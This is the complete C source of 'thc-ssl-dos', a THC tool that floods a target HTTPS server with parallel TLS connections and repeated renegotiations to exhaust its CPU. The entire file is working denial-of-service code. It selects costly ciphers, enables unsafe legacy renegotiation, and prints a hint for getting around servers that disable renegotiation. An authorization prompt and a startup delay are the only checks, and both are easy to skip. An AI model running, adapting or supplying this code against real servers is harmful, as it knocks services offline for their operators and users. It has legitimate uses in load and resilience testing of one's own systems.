
#include "common.h"
#include <getopt.h>
#include <openssl/ssl.h>
#include <openssl/err.h>


#define MAX_PEERS		(999)
#define DEFAULT_PEERS		(400)
#define PROGRAM_NAME		"thc-ssl-dos"
#define TO_TCP_CONNECT		(10)	/* 10 second TCP connect() timeout */


struct _statistics
{
	uint32_t total_tcp_connections;
	uint32_t total_renegotiations;
	uint32_t total_ssl_connect;
	uint32_t error_count;
	uint64_t epoch_start_usec;
	uint32_t epoch_start_renegotiations;
};

struct _opt
{
	uint32_t flags;
	uint16_t n_peers;
	uint16_t n_max_peers;
	uint32_t ip;
	uint16_t port;
	fd_set rfds;
	fd_set wfds;
	int max_sox;
	SSL_CTX *ctx;
	struct _statistics stat;
	int slowstart_last_peer_idx;
};
#define FL_SECURE_RENEGOTIATION		(0x01)
#define FL_UNSECURE_RENEGOTIATION	(0x02)
#define FL_OUTPUT_SR_ONCE		(0x04)

enum _states
{
	STATE_UNKNOWN = 0,
	STATE_TCP_CONNECTING,
	STATE_SSL_CONNECTING,
	STATE_SSL_HANDSHAKING,
	STATE_SSL_DUMMYWRITE
};

struct _peer
{
	uint32_t flags;
	SSL *ssl;
	int sox;
	enum _states state;
	struct sockaddr_in addr;
	uint32_t count_renegotiations;
	uint32_t tv_connect_sec;
};
#define FL_PEER_WANT_NEXT_STATE		(0x04)

struct _peer peers[MAX_PEERS];
#define PEER_GET_IDX(xpeer)	(int)(xpeer - &peers[0])

struct _opt g_opt;

#define ERREXIT(a...)	do { \
	fprintf(stderr, "%s:%d ", __func__, __LINE__); \
	fprintf(stderr, a); \
	exit(-1); \
} while (0)

#define DEBUGF(a...)	do { \
	fprintf(stderr, "%s:%d ", __FILE__, __LINE__); \
	fprintf(stderr, a); \
} while (0)

#define SSLERR(a...)	do { \
	fprintf(stderr, a); \
	fprintf(stderr, ": %s\n", ERR_error_string(ERR_get_error(), NULL)); \
} while (0)

#define SSLERREXIT(a...)	do { \
	SSLERR(a); \
	exit(-1); \
} while (0)

static int tcp_connect_io(struct _peer *p);
static int tcp_connect_try_finish(struct _peer *p, int ret);
static void PEER_SSL_renegotiate(struct _peer *p);
static void PEER_connect(struct _peer *p);
static void PEER_disconnect(struct _peer *p);

static char *
int_ntoa(uint32_t ip)
{
	struct in_addr x;

	//memset(&x, 0, sizeof x);
	x.s_addr = ip;
	return inet_ntoa(x);
}

static uint64_t
getusec(struct timeval *tv)
{
	struct timeval tv_l;

	if (tv == NULL)
	{
		tv = &tv_l;
		gettimeofday(tv, NULL);
	}

	return (uint64_t)tv->tv_sec * 1000000 + tv->tv_usec;
}

static void
init_default(void)
{
	g_opt.n_max_peers = DEFAULT_PEERS;
	g_opt.port = htons(443);
	g_opt.ip = -1; //inet_addr("127.0.0.1");
	FD_ZERO(&g_opt.rfds);
	FD_ZERO(&g_opt.wfds);
}

static void
init_vars(void)
{
	SSL_library_init();
	SSL_load_error_strings();
	g_opt.ctx = SSL_CTX_new(SSLv23_method()); 

#ifdef SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION
	SSL_CTX_set_options(g_opt.ctx, SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION);
	/* Always guarantee we can connect to unpatched SSL Servers */
	SSL_CTX_set_options(g_opt.ctx, SSL_OP_LEGACY_SERVER_CONNECT);
#endif
	/* AES256-SHA              SSLv3 Kx=RSA      Au=RSA  Enc=AES(256) */
	/* RC4-MD5                 SSLv3 Kx=RSA      Au=RSA  Enc=RC4(128) */
	/* RSA_decrypt() is 15x slower (used for Kx) than RSA_encrypt() */
	SSL_CTX_set_cipher_list(g_opt.ctx, "AES256-SHA:RC4-MD5");
	//SSL_CTX_set_cipher_list(g_opt.ctx, "AES256-SHA");
	//SSL_CTX_set_cipher_list(g_opt.ctx, "RC4-MD5");
	//SSL_CTX_set_options(g_opt.ctx, SSL_OP_NO_TLSv1);
	//SSL_CTX_set_options(ctx, SSL_OP_LEGACY_SERVER_CONNECT);

	int i;
	for (i = 0; i < MAX_PEERS; i++)
		peers[i].sox = -1;
}

static void
usage(void)
{
	fprintf(stderr, ""
"./" PROGRAM_NAME " [options] <ip> <port>\n"
"  -h      help\n"
"  -l <n>  Limit parallel connections [default: %d]\n"
"", DEFAULT_PEERS);
	exit(0);
}

static void
do_getopt(int argc, char *argv[])
{
	int c;
	int i;
	static int accept_flag = 0;
	static int skipdelay_flag = 0;

	static struct option long_options[] =
	{
		{"accept", no_argument, &accept_flag, 1},
		{"skip-delay", no_argument, &skipdelay_flag, 1},
		{0, 0, 0, 0}
	};
	int option_index = 0;
	

	while ((c = getopt_long(argc, argv, "hl:", long_options, &option_index)) != -1)
	{
		switch (c)
		{
		case 0:
			break;
		case 'l':
			g_opt.n_max_peers = atoi(optarg);
			break;
		case 'h':
		default:
			usage();
		}
	}

	if (optind >= argc)
	{
		usage();
	}

	if (accept_flag == 0)
	{
		fprintf(stderr, ""
"ERROR:\n"
"Please agree by using '--accept' option that the IP is a legitimate target\n"
"and that you are fully authorized to perform the test against this target.\n"
"");
		exit(-1);
	}

	i = optind;
	if (i < argc)
	{
		g_opt.ip = inet_addr(argv[i]);
		i++;
	}
	if (i < argc)
	{
		g_opt.port = htons(atoi(argv[i]));
		i++;
	}

	if (g_opt.ip == -1)
		ERREXIT("ERROR: Invalid target IP address\n");

#if 1
	if (skipdelay_flag == 0)
	{
		printf("Waiting for script kiddies to piss off.");
		fflush(stdout);
		for (c = 0; c < 15; c++)
		{
			sleep(1);
			printf(".");
			fflush(stdout);
		}
		printf("\nThe force is with those who read the source...\n");
	}
#endif
}

static void
SSL_set_rw(struct _peer *p, int ret)
{
	int err;

	err = SSL_get_error(p->ssl, ret);
	switch (err)
	{
	case SSL_ERROR_WANT_READ:
		FD_SET(p->sox, &g_opt.rfds);
		FD_CLR(p->sox, &g_opt.wfds);
		break;
	case SSL_ERROR_WANT_WRITE:
		FD_SET(p->sox, &g_opt.wfds);
		FD_CLR(p->sox, &g_opt.rfds);
		break;
	default:
		SSLERR("SSL");
		if (g_opt.stat.total_ssl_connect <= 0)
		{
			fprintf(stderr, "#%d: This does not look like SSL!\n", PEER_GET_IDX(p));
			exit(-1);
		}
		g_opt.stat.error_count++;
		PEER_disconnect(p);
		return;
	}
}

static int
ssl_handshake_io(struct _peer *p)
{
	int ret;

	/* Empty input buffer in case peer send data to us */
	char buf[1024];
	while (1)
	{
		ret = SSL_read(p->ssl, buf, sizeof buf);
		if (ret <= 0)
			break;
	}
	ret = SSL_do_handshake(p->ssl);
	if (ret == 1)
	{
		p->flags |= FL_PEER_WANT_NEXT_STATE;

		/* Stunnel watchdog bug, disconnect if no data is send */
		g_opt.stat.total_renegotiations++;
		p->count_renegotiations++;
		if (p->count_renegotiations % 50 == 0)
		{
			p->state = STATE_SSL_DUMMYWRITE;
		} else {
			p->state = STATE_SSL_HANDSHAKING;
		}

		return 0;
	}

	int err;
	err = SSL_get_error(p->ssl, ret);
	if ((err != SSL_ERROR_WANT_READ) && (err != SSL_ERROR_WANT_WRITE))
	{
		/* Renegotiation is not supported */
		if (g_opt.stat.total_renegotiations <= 0)
		{
			fprintf(stderr, ""
"ERROR: Target has disabled renegotiations.\n"
"Use your own skills to modify the source to test/attack\n"
"the target [hint: TCP reconnect for every handshake].\n");
			exit(-1);
		}
	}

	SSL_set_rw(p, ret);
	return 0;
}

static int
ssl_connect_io(struct _peer *p)
{
	int ret;

	ret = SSL_connect(p->ssl);
	if (ret == 1)
	{
		g_opt.stat.total_ssl_connect++;
#if 0
		if (!(g_opt.flags & FL_OUTPUT_SR_ONCE))
		{
			g_opt.flags |= FL_OUTPUT_SR_ONCE;
#ifdef SSL_get_secure_renegotiation_support
			ret = SSL_get_secure_renegotiation_support(p->ssl);
			printf("Secure Renegotiation support: %s\n", SSL_get_secure_renegotiation_support(p->ssl)?"yes":"no");
#else
			printf("Secure Renegotiation support: UNKNOWN. [Update your OpenSSL library!]\n");
#endif
		}
#endif

		p->flags |= FL_PEER_WANT_NEXT_STATE;
		p->state = STATE_SSL_HANDSHAKING;
		return 0;
	}

	SSL_set_rw(p, ret);

	return 0;
}

static int
ssl_dummywrite_io(struct _peer *p)
{
	char c = 0;
	int ret;

	ret = SSL_write(p->ssl, &c, 1);
	if (ret == 1)
	{
		p->flags |= FL_PEER_WANT_NEXT_STATE;
		p->state = STATE_SSL_HANDSHAKING;
		return 0;
	}

	SSL_set_rw(p, ret);

	return 0;
}


static void
PEER_SSL_dummywrite(struct _peer *p)
{
	p->state = STATE_SSL_DUMMYWRITE;

	//DEBUGF("%d DummyWrite at %d\n", PEER_GET_IDX(p), p->count_renegotiations);
	ssl_dummywrite_io(p);
}

static void
PEER_SSL_renegotiate(struct _peer *p)
{
	int ret;

	ret = SSL_renegotiate(p->ssl);
	if (ret != 1)
	{
		DEBUGF("SSL_renegotiate() failed\n");
		g_opt.stat.error_count++;
		PEER_disconnect(p);
		return;
	}

	p->state = STATE_SSL_HANDSHAKING;
	ssl_handshake_io(p);
}

static void
PEER_SSL_connect(struct _peer *p)
{
	p->ssl = SSL_new(g_opt.ctx);
	SSL_set_fd(p->ssl, p->sox);
	p->state = STATE_SSL_CONNECTING;

	ssl_connect_io(p);
}

static void
NextState(struct _peer *p)
{

	p->flags &= ~FL_PEER_WANT_NEXT_STATE;

	switch (p->state)
	{
	case STATE_TCP_CONNECTING:
		PEER_connect(p);
		break;
	case STATE_SSL_DUMMYWRITE:
		PEER_SSL_dummywrite(p);
		break;
	case STATE_SSL_HANDSHAKING:
		PEER_SSL_renegotiate(p);
		break;
	default:
		DEBUGF("NextState(): unknown state: %d\n", p->state);
	}
}

static void
CompleteState(struct _peer *p)
{
	int ret;

	switch (p->state)
	{
	case STATE_TCP_CONNECTING:
		ret = tcp_connect_io(p);
		if (ret != 0)
		{
			DEBUGF("%d tcp_connect_io(): %s\n", PEER_GET_IDX(p), strerror(errno));
			g_opt.stat.error_count++;
			PEER_disconnect(p);
		} else {
			/* TCP connect() successfully */
			if (g_opt.n_peers < g_opt.n_max_peers)
			{
				//DEBUGF("#%d Activating..\n", g_opt.n_peers);
				/* Slowly connect more TCP connections */
				if (peers[g_opt.n_peers].state != STATE_UNKNOWN)
					ERREXIT("internal error\n");
				PEER_disconnect(&peers[g_opt.n_peers]);
				g_opt.n_peers++;
			}
		}
		break;
	case STATE_SSL_CONNECTING:
		ret = ssl_connect_io(p);
		if (ret != 0)
			ERREXIT("ssl_connect_io() failed\n");
		break;
	case STATE_SSL_HANDSHAKING:
		ret = ssl_handshake_io(p);
		if (ret != 0)
		{
			DEBUGF("ssl_handshake_io() failed\n");
			g_opt.stat.error_count++;
			PEER_disconnect(p);
		}
		break;
	case STATE_SSL_DUMMYWRITE:
		ret = ssl_dummywrite_io(p);
		if (ret != 0)
		{
			DEBUGF("ssl_dummywrite_io() failed\n");
			g_opt.stat.error_count++;
			PEER_disconnect(p);
		}
		break;
	default:
		ERREXIT("Unknown state: %d\n", p->state);
	}

}

/*
 * Called if in state STATE_TCP_CONNECTING
 */
static int
tcp_connect_io(struct _peer *p)
{
	int ret;
	socklen_t len;

	/* Socket became writeable. Either the connection was successfull
 	 * (errno == 0) or we have an error and we have to reconnect.
 	 */
	len = 4;
	getsockopt(p->sox, SOL_SOCKET, SO_ERROR, &errno, &len);

	//DEBUGF("ret %d errno %d %s\n", ret, errno, strerror(errno));
	ret = tcp_connect_try_finish(p, errno);

	return ret;
}

static int
tcp_connect_try_finish(struct _peer *p, int ret)
{
	if (ret != 0)
	{
		if ((errno != EINPROGRESS) && (errno != EAGAIN))
		{
			if (g_opt.stat.total_tcp_connections <= 0)
			{
				fprintf(stderr, "TCP connect(%s:%d): %s\n", int_ntoa(g_opt.ip), ntohs(g_opt.port), strerror(errno));
				exit(-1);

			}
			return -1;
		}
		p->state = STATE_TCP_CONNECTING;
		FD_SET(p->sox, &g_opt.wfds);
		FD_CLR(p->sox, &g_opt.rfds);

		return 0;
	} else {
		g_opt.stat.total_tcp_connections++;
		FD_CLR(p->sox, &g_opt.wfds);
		PEER_SSL_connect(p);
	}

	return 0;
}

int
tcp_connect(struct _peer *p)
{
	int ret;

	p->sox = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (p->sox < 0)
		return -1;

	if (p->sox > g_opt.max_sox)
		g_opt.max_sox = p->sox;

	fcntl(p->sox, F_SETFL, fcntl(p->sox, F_GETFL, 0) | O_NONBLOCK);

	memset(&p->addr, 0, sizeof p->addr);
	p->addr.sin_family = AF_INET;
	p->addr.sin_port = g_opt.port;
	p->addr.sin_addr.s_addr = g_opt.ip;

	ret = connect(p->sox, (struct sockaddr *)&p->addr, sizeof p->addr);
	struct timeval tv;
	gettimeofday(&tv, NULL);
	p->tv_connect_sec = tv.tv_sec;
	/* On some linux connect() on localhost can complete instantly even
 	 * on non-blocking sockets.
 	 */
	ret = tcp_connect_try_finish(p, ret);

	return ret;
}

static void
PEER_read(struct _peer *p)
{
	CompleteState(p);
}

static void
PEER_write(struct _peer *p)
{
	CompleteState(p);
}


/*
 * Connect the peer via TCP
 */
static void
PEER_connect(struct _peer *p)
{
	if (tcp_connect(p) != 0)
	{
		ERREXIT("tcp_connect(): %s\n", strerror(errno));
	}
}

static void
PEER_disconnect(struct _peer *p)
{
	if (p->ssl != NULL)
	{
		/* Make sure session is not kept in cache.
 		 * Calling SSL_free() without calling SSL_shutdown will
 		 * also remove the session from the session cache.
 		 */
		SSL_free(p->ssl);
		p->ssl = NULL;
	}
	if (p->sox >= 0)
	{
		FD_CLR(p->sox, &g_opt.rfds);
		FD_CLR(p->sox, &g_opt.wfds);
		close(p->sox);
		p->sox = -1;
	}

	p->state = STATE_TCP_CONNECTING;
	p->flags = FL_PEER_WANT_NEXT_STATE;
}

static void
statistics_update(struct timeval *tv)
{
	int32_t reneg_delta;
	uint32_t usec_delta;
	uint64_t usec_now;
	int32_t conn = 0;
	int i;

	reneg_delta = g_opt.stat.total_renegotiations - g_opt.stat.epoch_start_renegotiations;
	usec_now = getusec(tv);
	usec_delta = usec_now - g_opt.stat.epoch_start_usec;

	for (i = 0; i < g_opt.n_peers; i++)
	{
		if (peers[i].sox < 0)
			continue;
		if (peers[i].state > STATE_TCP_CONNECTING)
			conn++;
	}
	printf("Handshakes %" PRIu32" [%.2f h/s], %" PRId32 " Conn, %" PRIu32 " Err\n", g_opt.stat.total_renegotiations, (float)(1000000 * reneg_delta) / usec_delta, conn, g_opt.stat.error_count);

	g_opt.stat.epoch_start_renegotiations = g_opt.stat.total_renegotiations;
	g_opt.stat.epoch_start_usec = usec_now;
}

int
main(int argc, char *argv[])
{
	int n;
	int i;
	fd_set rfds;
	fd_set wfds;

printf(""
"     ______________ ___  _________\n"
"     \\__    ___/   |   \\ \\_   ___ \\\n"
"       |    | /    ~    \\/    \\  \\/\n"
"       |    | \\    Y    /\\     \\____\n"
"       |____|  \\___|_  /  \\______  /\n"
"                     \\/          \\/\n"
"            http://www.thc.org\n"
"\n"
"          Twitter @hackerschoice\n"
"\n"
"Greetingz: the french underground\n"
"\n");
	fflush(stdout);

	init_default();
	do_getopt(argc, argv);
	init_vars();

	g_opt.n_peers = 1;
	for (i = 0; i < g_opt.n_peers; i++)
	{
		PEER_disconnect(&peers[i]);
	}

	struct timeval tv;
	while (1)
	{
		for (i = 0; i < g_opt.n_peers; i++)
		{
			if (peers[i].flags & FL_PEER_WANT_NEXT_STATE)
				NextState(&peers[i]);
		}
		tv.tv_sec = 0;
		tv.tv_usec = 100 * 1000;
		memcpy(&rfds, &g_opt.rfds, sizeof rfds);
		memcpy(&wfds, &g_opt.wfds, sizeof wfds);
		n = select(g_opt.max_sox + 1, &rfds, &wfds, NULL, &tv);
		gettimeofday(&tv, NULL);
		if (tv.tv_sec != g_opt.stat.epoch_start_usec / 1000000)
		{
			if (g_opt.stat.total_tcp_connections > 0)
				statistics_update(&tv);
		}

		if (n < 0)
			ERREXIT("select(): %s\n", strerror(errno));

		/* g_opt.n_peers is dynamicly modified in this loop */
		int end = g_opt.n_peers;
		for (i = 0; i < end; i++)
		{
			if ((peers[i].state == STATE_TCP_CONNECTING) && (peers[i].tv_connect_sec + TO_TCP_CONNECT < tv.tv_sec))
			{
				fprintf(stderr, "#%d Connection timed out\n", i);
				PEER_disconnect(&peers[i]);
				continue;
			}
			if (peers[i].sox < 0)
				continue;
			if (FD_ISSET(peers[i].sox, &rfds))
			{
				PEER_read(&peers[i]);
				continue;
			}
			if (FD_ISSET(peers[i].sox, &wfds))
			{
				PEER_write(&peers[i]);
				continue;
			}
		}

	}

	exit(0);
	return 0;
}

